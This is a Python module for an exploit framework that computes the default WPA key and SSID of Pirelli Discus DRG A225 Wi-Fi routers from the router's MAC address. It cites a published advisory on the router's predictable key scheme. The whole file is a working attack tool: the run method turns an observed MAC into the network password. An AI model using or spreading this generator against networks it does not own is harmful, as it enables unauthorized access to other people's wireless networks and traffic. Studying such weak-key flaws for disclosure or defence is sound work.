# coding=utf-8
from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = "Pirelli Discus DRG A225 WiFi router default WPA generator",
            category = "generator",
            authors = "Muris Kurgas",
            date = "17/02/2014",
            cwe = "CWE-310: Cryptographic Issues",
            references = "http://www.remote-exploit.org/content/Pirelli_Discus_DRG_A225_WiFi_router.pdf",
            description = " Generates WPA key for Pirelli Discus DRG A225 (used e.g. by Croatian T-com)"
        )

    def run(self, mac):
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")

        const = int('D0EC31', 16)
        inp = int(mac[6:], 16)
        result = (inp - const) // 4
        ssid = "Discus--" + mac[6:]
        key = "YW0" + str(result)
        return "{0} - {1}".format(key, ssid)
